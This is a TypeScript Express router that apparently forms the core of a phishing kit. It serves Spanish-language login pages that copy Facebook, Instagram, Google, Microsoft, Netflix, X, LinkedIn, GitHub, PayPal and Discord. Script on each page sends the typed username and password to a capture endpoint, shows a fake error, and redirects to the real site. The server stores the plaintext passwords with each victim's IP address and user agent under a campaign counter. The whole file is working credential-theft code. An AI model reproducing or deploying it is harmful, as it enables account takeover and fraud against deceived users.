import { Router, type IRouter } from "express";
import { db, capturesTable, campaignsTable } from "@workspace/db";
import { eq, sql } from "drizzle-orm";

const router: IRouter = Router();

const TEMPLATE_CONFIG: Record<string, { name: string; logo: string; color: string; bgColor: string; btnColor: string; placeholder: string; passPlaceholder: string; redirect: string; subtitle: string }> = {
  facebook: {
    name: "Facebook",
    logo: `<svg viewBox="0 0 36 36" fill="url(#jja3or)" height="36" width="36"><defs><linearGradient x1="50%" x2="50%" y1="97.0782%" y2="0%" id="jja3or"><stop offset="0%" stop-color="#0062E0"></stop><stop offset="100%" stop-color="#19AFFF"></stop></linearGradient></defs><path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z" fill="url(#jja3or)"></path><path d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z" fill="#FFF"></path></svg>`,
    color: "#1877f2",
    bgColor: "#f0f2f5",
    btnColor: "#1877f2",
    placeholder: "Correo electrónico o teléfono",
    passPlaceholder: "Contraseña",
    redirect: "https://facebook.com",
    subtitle: "Conéctate con tus amigos y el mundo.",
  },
  instagram: {
    name: "Instagram",
    logo: `<svg width="36" height="36" viewBox="0 0 512 512" fill="none"><defs><radialGradient id="ig1" cx="30%" cy="107%" r="150%"><stop offset="0%" stop-color="#fdf497"/><stop offset="5%" stop-color="#fdf497"/><stop offset="45%" stop-color="#fd5949"/><stop offset="60%" stop-color="#d6249f"/><stop offset="90%" stop-color="#285AEB"/></radialGradient></defs><rect width="512" height="512" rx="100" fill="url(#ig1)"/><rect x="120" y="120" width="272" height="272" rx="72" stroke="white" stroke-width="40" fill="none"/><circle cx="256" cy="256" r="80" stroke="white" stroke-width="40" fill="none"/><circle cx="355" cy="157" r="22" fill="white"/></svg>`,
    color: "#C13584",
    bgColor: "#fafafa",
    btnColor: "linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)",
    placeholder: "Teléfono, nombre de usuario o correo",
    passPlaceholder: "Contraseña",
    redirect: "https://instagram.com",
    subtitle: "Inicia sesión para ver fotos y videos de tus amigos.",
  },
  google: {
    name: "Google",
    logo: `<svg viewBox="0 0 48 48" width="40" height="40"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="none" d="M0 0h48v48H0z"/></svg>`,
    color: "#4285F4",
    bgColor: "#fff",
    btnColor: "#4285F4",
    placeholder: "Correo electrónico o teléfono",
    passPlaceholder: "Contraseña",
    redirect: "https://google.com",
    subtitle: "Inicia sesión con tu Cuenta de Google",
  },
  microsoft: {
    name: "Microsoft",
    logo: `<svg width="36" height="36" viewBox="0 0 48 48"><rect x="0" y="0" width="22" height="22" fill="#F25022"/><rect x="26" y="0" width="22" height="22" fill="#7FBA00"/><rect x="0" y="26" width="22" height="22" fill="#00A4EF"/><rect x="26" y="26" width="22" height="22" fill="#FFB900"/></svg>`,
    color: "#0078d4",
    bgColor: "#fff",
    btnColor: "#0078d4",
    placeholder: "Correo electrónico, teléfono o Skype",
    passPlaceholder: "Contraseña",
    redirect: "https://microsoft.com",
    subtitle: "Iniciar sesión con Microsoft",
  },
  netflix: {
    name: "Netflix",
    logo: `<svg viewBox="0 0 111 30" width="90" height="25" fill="#E50914"><path d="M105.06 0l-10.34 23.02V30h6.1V15.46L111 30v-7.86L105.06 0zM0 0v30h6.1V0H0zm15.2 0v30h6.1V17.04l8.5 12.96h6.76L26.3 14.96 36.05 0h-6.3L22.18 12.04V0H15.2zm28.3 0v30h18.5v-5.43H49.6V0H43.5zm22.37 0v30h6.1V17.04l8.5 12.96h6.77L82.57 14.96 92.33 0H86l-7.57 12.04V0H65.87z"/></svg>`,
    color: "#E50914",
    bgColor: "#000",
    btnColor: "#E50914",
    placeholder: "Correo electrónico o número de teléfono",
    passPlaceholder: "Contraseña",
    redirect: "https://netflix.com",
    subtitle: "Inicia sesión en Netflix",
  },
  twitter: {
    name: "Twitter / X",
    logo: `<svg viewBox="0 0 24 24" width="36" height="36" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.748l7.73-8.835L1.254 2.25H8.08l4.259 5.63zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>`,
    color: "#000",
    bgColor: "#000",
    btnColor: "#fff",
    placeholder: "Teléfono, correo electrónico o nombre de usuario",
    passPlaceholder: "Contraseña",
    redirect: "https://twitter.com",
    subtitle: "Inicia sesión en X",
  },
  linkedin: {
    name: "LinkedIn",
    logo: `<svg width="80" height="21" viewBox="0 0 80 21" fill="#0A66C2"><path d="M78.9 1.7A2.7 2.7 0 0076.2 0a2.7 2.7 0 00-2.7 2.7v18a.3.3 0 00.3.3h4.8a.3.3 0 00.3-.3v-18c0-.4-.1-.7-.2-1zM36.2 0a11 11 0 00-6.2 1.9V.7a.3.3 0 00-.3-.3h-4.8a.3.3 0 00-.3.3v20a.3.3 0 00.3.3h4.8a.3.3 0 00.3-.3v-9.9a6 6 0 1112 0v9.9a.3.3 0 00.3.3h4.8a.3.3 0 00.3-.3v-9.9A11 11 0 0036.2 0zM7.2 0a7.2 7.2 0 100 14.4A7.2 7.2 0 007.2 0zm0 9.9a2.7 2.7 0 110-5.4 2.7 2.7 0 010 5.4zm8.8 10.8H.4a.3.3 0 01-.3-.3V14.7a.3.3 0 01.3-.3h15.6a.3.3 0 01.3.3v5.7a.3.3 0 01-.3.3z"/></svg>`,
    color: "#0A66C2",
    bgColor: "#fff",
    btnColor: "#0A66C2",
    placeholder: "Correo electrónico",
    passPlaceholder: "Contraseña",
    redirect: "https://linkedin.com",
    subtitle: "Inicia sesión en LinkedIn",
  },
  github: {
    name: "GitHub",
    logo: `<svg width="36" height="36" viewBox="0 0 16 16" fill="white"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>`,
    color: "#24292f",
    bgColor: "#fff",
    btnColor: "#24292f",
    placeholder: "Nombre de usuario o correo",
    passPlaceholder: "Contraseña",
    redirect: "https://github.com",
    subtitle: "Inicia sesión en GitHub",
  },
  paypal: {
    name: "PayPal",
    logo: `<svg width="90" height="23" viewBox="0 0 101 32" fill="none"><text y="26" font-size="28" font-weight="bold" fill="#003087" font-family="Arial">Pay</text><text x="42" y="26" font-size="28" font-weight="bold" fill="#009cde" font-family="Arial">Pal</text></svg>`,
    color: "#003087",
    bgColor: "#fff",
    btnColor: "#0070ba",
    placeholder: "Correo electrónico",
    passPlaceholder: "Contraseña",
    redirect: "https://paypal.com",
    subtitle: "Accede a tu cuenta PayPal",
  },
  discord: {
    name: "Discord",
    logo: `<svg width="36" height="27" viewBox="0 -28.5 256 256" fill="#5865F2"><path d="M216.856339 16.5966031C200.285002 8.84328665 182.566144 3.2084988 164.041564 0c-2.275053 4.11312869-4.92421 9.65799849-6.749461 14.0519919-19.695819-2.9628-39.250514-2.9628-58.5910004 0C96.9959011 9.65799849 94.285419 4.11312869 91.9929502 0 73.4522559 3.2084988 55.7171417 8.86399117 39.0583372 16.5966031 5.61007613 67.146514-3.4504166 116.400813 1.08585671 164.955721c23.4161422 17.4020529 46.1535 28.0201019 68.4959648 34.9701319 5.5089 7.6018999 10.4452 15.6617319 14.7327 24.1217749 0 0-9.1512-3.4459-13.7348-5.3349-29.1098-12.1066-56.7661-27.9993-81.9999-47.6266-6.0424-4.7673-11.7695-9.5347-17.1832-14.3018 7.6437 32.1744 24.3427 61.3497 47.888 84.0005 34.8069 33.7208 84.7793 54.4997 139.1111 54.4997 54.3318 0 104.3042-20.7789 139.1111-54.4997 23.5453-22.6508 40.2443-51.8261 47.888-84.0005-5.4137 4.7671-11.1408 9.5345-17.1832 14.3018-25.2338 19.6273-52.8901 35.52-81.9999 47.6266-4.5836 1.889-13.7348 5.3349-13.7348 5.3349 4.2875-8.4600459 9.2238-16.5198779 14.7327-24.1217749 22.3424657-6.95003 45.0799269-17.568079 68.4959638-34.9701319 4.5363-48.5549059-4.5136-97.8092-38.0218-148.3593089zm-168.0023 119.9966c-12.0793 0-22.0264-11.0572-22.0264-24.6519 0-13.5947 9.7453-24.6695 22.0264-24.6695 12.2811 0 22.228 11.0748 22.0264 24.6695.0176 13.5947-9.7453 24.6519-22.0264 24.6519zm81.2847 0c-12.0793 0-22.0264-11.0572-22.0264-24.6519 0-13.5947 9.7453-24.6695 22.0264-24.6695 12.2811 0 22.228 11.0748 22.0264 24.6695.0176 13.5947-9.7453 24.6519-22.0264 24.6519z"/></svg>`,
    color: "#5865F2",
    bgColor: "#313338",
    btnColor: "#5865F2",
    placeholder: "Correo electrónico",
    passPlaceholder: "Contraseña",
    redirect: "https://discord.com",
    subtitle: "Inicia sesión en Discord",
  },
};

const DEFAULT_CONFIG = {
  name: "Portal",
  logo: `<span style="font-size:36px">🔐</span>`,
  color: "#6366f1",
  bgColor: "#f1f5f9",
  btnColor: "#6366f1",
  placeholder: "Correo electrónico o usuario",
  passPlaceholder: "Contraseña",
  redirect: "https://google.com",
  subtitle: "Inicia sesión en tu cuenta",
};

function buildFacebookPage(sessionId: string): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Facebook – inicia sesión o regístrate</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
    background: #fff;
    min-height: 100vh;
    color: #1c1e21;
    font-size: 14px;
  }
  .top-banner {
    background: #fff;
    border-bottom: 1px solid #dddfe2;
    padding: 10px 16px;
    display: flex;
    align-items: center;
    gap: 10px;
    color: #1877f2;
    font-size: 13px;
  }
  .top-banner svg { flex-shrink: 0; }
  .lang-bar {
    text-align: center;
    padding: 18px 16px 0;
    font-size: 13px;
    color: #606770;
  }
  .main {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px 16px 0;
  }
  .fb-logo {
    width: 72px;
    height: 72px;
    background: #1877f2;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 24px;
  }
  .fb-logo svg { width: 42px; height: 42px; }
  .form-group {
    width: 100%;
    max-width: 420px;
    margin-bottom: 12px;
  }
  .form-group input {
    width: 100%;
    padding: 14px 14px;
    border: 1px solid #ccd0d5;
    border-radius: 6px;
    font-size: 16px;
    background: #fff;
    color: #1c1e21;
    outline: none;
    -webkit-appearance: none;
  }
  .form-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
  .form-group input::placeholder { color: #90949c; }
  .btn-login {
    width: 100%;
    max-width: 420px;
    padding: 14px;
    background: #1877f2;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 4px;
    -webkit-appearance: none;
  }
  .btn-login:active { background: #166fe5; }
  .btn-login:disabled { opacity: 0.7; }
  .forgot {
    text-align: center;
    margin-top: 20px;
    margin-bottom: 28px;
    max-width: 420px;
    width: 100%;
  }
  .forgot a { color: #1877f2; text-decoration: none; font-size: 13px; }
  .divider {
    width: 100%;
    max-width: 420px;
    border: none;
    border-top: 1px solid #dddfe2;
    margin-bottom: 24px;
  }
  .btn-register {
    width: 100%;
    max-width: 260px;
    padding: 13px;
    background: #fff;
    color: #42b72a;
    border: 1.5px solid #42b72a;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 32px;
    -webkit-appearance: none;
    text-align: center;
  }
  .btn-register:active { background: #f0faf0; }
  .meta-logo {
    text-align: center;
    padding: 0 16px 32px;
    color: #8a8d91;
    font-size: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
  .error-msg {
    color: #d93025;
    font-size: 13px;
    text-align: center;
    margin-bottom: 10px;
    max-width: 420px;
    width: 100%;
    background: #fce8e6;
    padding: 10px 14px;
    border-radius: 6px;
    display: none;
  }
</style>
</head>
<body>

<div class="top-banner">
  <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877f2"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
  Descarga Facebook para Android y navega más rápido.
</div>

<div class="lang-bar">Español</div>

<div class="main">
  <div class="fb-logo">
    <svg viewBox="0 0 36 36" fill="#fff">
      <path d="M20.18 35.87V22.26h4.58l.69-5.32h-5.27v-3.4c0-1.54.43-2.59 2.63-2.59h2.81V6.29A37.68 37.68 0 0016.3 6c-4.07 0-6.85 2.48-6.85 7.04v3.93H5v5.32h4.45v13.58a18.18 18.18 0 0010.73 0z"/>
    </svg>
  </div>

  <div class="error-msg" id="err">El número de teléfono o la contraseña que has introducido es incorrecto.</div>

  <form id="loginForm" style="width:100%;max-width:420px;display:flex;flex-direction:column;align-items:center;">
    <div class="form-group">
      <input type="text" id="username" name="username" placeholder="Celular o correo electrónico" autocomplete="username" autocapitalize="off" autocorrect="off" required>
    </div>
    <div class="form-group">
      <input type="password" id="password" name="password" placeholder="Contraseña" autocomplete="current-password" required>
    </div>
    <button type="submit" class="btn-login" id="btn">Iniciar sesión</button>
  </form>

  <div class="forgot">
    <a href="#">¿Olvidaste tu contraseña?</a>
  </div>

  <hr class="divider">

  <button class="btn-register" onclick="return false;">Crear cuenta nueva</button>
</div>

<div class="meta-logo">
  <svg width="16" height="16" viewBox="0 0 60 60" fill="#8a8d91"><path d="M30 6.3C16.9 6.3 6.3 16.9 6.3 30S16.9 53.7 30 53.7 53.7 43.1 53.7 30 43.1 6.3 30 6.3zm0 43.1C19.8 49.4 10.6 40.2 10.6 30 10.6 19.8 19.8 10.6 30 10.6c10.2 0 19.4 9.2 19.4 19.4 0 10.2-9.2 19.4-19.4 19.4z"/><path d="M21 30c0-2.2.5-4 1.1-5.1C23.3 22.8 24.8 22 26.5 22c1.5 0 2.7.5 4.1 2.2.9 1.1 1.8 2.8 2.6 4.9.8-2.1 1.7-3.8 2.6-4.9C37.2 22.5 38.4 22 40 22c1.7 0 3.2.8 4.4 2.9.6 1.1 1.1 2.9 1.1 5.1 0 2.7-.8 5-2.3 6.8C41.7 38.8 40 39.8 38 39.8c-1.4 0-2.6-.4-3.7-1.3-1-.8-2-2.1-3-3.9-.5-.9-.9-1.8-1.3-2.7-.4.9-.8 1.8-1.3 2.7-1 1.8-2 3.1-3 3.9-1.1.9-2.3 1.3-3.7 1.3-2 0-3.7-1-4.9-2.4C21.8 35 21 32.7 21 30z"/></svg>
  Meta
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const btn = document.getElementById('btn');
  btn.disabled = true;
  btn.textContent = 'Comprobando...';
  try {
    await fetch('/api/phish/facebook/capture?session=${sessionId}', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, password: p })
    });
  } catch(err) {}
  setTimeout(() => {
    document.getElementById('err').style.display = 'block';
    btn.disabled = false;
    btn.textContent = 'Iniciar sesión';
    document.getElementById('password').value = '';
    document.getElementById('password').focus();
    setTimeout(() => { window.location.href = 'https://m.facebook.com'; }, 2500);
  }, 1400);
});
</script>
</body>
</html>`;
}

function buildPhishPage(templateId: string, sessionId: string): string {
  if (templateId === "facebook") return buildFacebookPage(sessionId);

  const cfg = TEMPLATE_CONFIG[templateId] ?? { ...DEFAULT_CONFIG, name: templateId };
  const isDark = cfg.bgColor === "#000" || cfg.bgColor === "#313338";

  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión - ${cfg.name}</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: ${cfg.bgColor};
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
  }
  .card {
    background: ${isDark ? (cfg.bgColor === "#313338" ? "#2b2d31" : "#141414") : "#fff"};
    border: 1px solid ${isDark ? "rgba(255,255,255,0.1)" : "rgba(0,0,0,0.12)"};
    border-radius: 12px;
    padding: 40px 32px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 8px 40px rgba(0,0,0,0.15);
  }
  .logo-area {
    text-align: center;
    margin-bottom: 24px;
  }
  .subtitle {
    text-align: center;
    color: ${isDark ? "rgba(255,255,255,0.7)" : "#555"};
    font-size: 15px;
    margin-bottom: 28px;
  }
  .field {
    margin-bottom: 14px;
  }
  .field input {
    width: 100%;
    padding: 13px 16px;
    border: 1.5px solid ${isDark ? "rgba(255,255,255,0.15)" : "#ddd"};
    border-radius: 8px;
    font-size: 15px;
    background: ${isDark ? "rgba(255,255,255,0.06)" : "#f8f8f8"};
    color: ${isDark ? "#fff" : "#111"};
    outline: none;
    transition: border-color 0.2s;
  }
  .field input:focus { border-color: ${cfg.color}; background: ${isDark ? "rgba(255,255,255,0.1)" : "#fff"}; }
  .field input::placeholder { color: ${isDark ? "rgba(255,255,255,0.4)" : "#aaa"}; }
  .btn {
    width: 100%;
    padding: 13px;
    border: none;
    border-radius: 8px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    color: ${templateId === "twitter" ? "#000" : "#fff"};
    background: ${cfg.btnColor.includes("gradient") ? cfg.btnColor : cfg.btnColor};
    margin-top: 8px;
    transition: opacity 0.2s, transform 0.1s;
  }
  .btn:hover { opacity: 0.9; transform: translateY(-1px); }
  .btn:active { transform: translateY(0); }
  .sep { text-align: center; color: ${isDark ? "rgba(255,255,255,0.4)" : "#aaa"}; font-size: 13px; margin: 16px 0; }
  .links { text-align: center; margin-top: 20px; }
  .links a { color: ${cfg.color}; text-decoration: none; font-size: 13px; }
  .links a:hover { text-decoration: underline; }
  .error { color: #e53e3e; font-size: 13px; text-align: center; margin-bottom: 12px; display: none; }
  .loading { display: none; text-align: center; color: ${isDark ? "rgba(255,255,255,0.6)" : "#666"}; margin-top: 12px; font-size: 14px; }
</style>
</head>
<body>
<div class="card">
  <div class="logo-area">${cfg.logo}</div>
  <p class="subtitle">${cfg.subtitle}</p>
  <div class="error" id="err">Correo o contraseña incorrectos. Inténtalo de nuevo.</div>
  <form id="loginForm">
    <div class="field">
      <input type="text" id="username" name="username" placeholder="${cfg.placeholder}" autocomplete="username" required>
    </div>
    <div class="field">
      <input type="password" id="password" name="password" placeholder="${cfg.passPlaceholder}" autocomplete="current-password" required>
    </div>
    <button type="submit" class="btn" id="btn">Iniciar sesión</button>
  </form>
  <div class="loading" id="loading">Verificando...</div>
  <div class="links">
    <a href="#">¿Olvidaste tu contraseña?</a>
  </div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  document.getElementById('btn').disabled = true;
  document.getElementById('loading').style.display = 'block';
  try {
    await fetch('/api/phish/${templateId}/capture?session=${sessionId}', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, password: p })
    });
  } catch(err) {}
  setTimeout(() => {
    document.getElementById('err').style.display = 'block';
    document.getElementById('loading').style.display = 'none';
    document.getElementById('btn').disabled = false;
    setTimeout(() => { window.location.href = '${cfg.redirect}'; }, 1800);
  }, 1200);
});
</script>
</body>
</html>`;
}

router.get("/phish/:templateId", (req, res) => {
  const { templateId } = req.params;
  const sessionId = req.query.session as string || "0";
  const html = buildPhishPage(templateId, sessionId);
  res.setHeader("Content-Type", "text/html");
  res.send(html);
});

router.post("/phish/:templateId/capture", async (req, res) => {
  const { templateId } = req.params;
  const sessionId = parseInt(req.query.session as string || "0", 10);
  const { username, password } = req.body;
  const ipAddress = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || null;
  const userAgent = req.headers["user-agent"] || null;

  try {
    await db.insert(capturesTable).values({
      campaignId: sessionId,
      username: username || null,
      password: password || null,
      ipAddress,
      userAgent,
    });

    await db.update(campaignsTable)
      .set({ captureCount: sql`${campaignsTable.captureCount} + 1`, updatedAt: new Date() })
      .where(eq(campaignsTable.id, sessionId));
  } catch (err) {
    req.log?.error({ err }, "Error saving capture");
  }

  res.json({ ok: true });
});

export default router;
